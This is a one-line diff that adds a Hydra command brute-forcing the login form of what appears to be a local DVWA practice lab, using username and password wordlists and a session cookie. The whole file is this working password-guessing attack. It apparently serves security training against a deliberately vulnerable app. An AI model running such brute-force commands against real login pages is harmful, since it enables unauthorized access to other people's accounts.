@@ -1,0 +1,1 @@
+sudo hydra -L /home/benjaminescandar/Descargas/users.txt -P /home/benjaminescandar/Descargas/contras.txt "http-get-form://localhost:4280/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=8640f59f987cc8a9ab9eb98698e3acc8; security=low:S=Welcome to the password protected area"
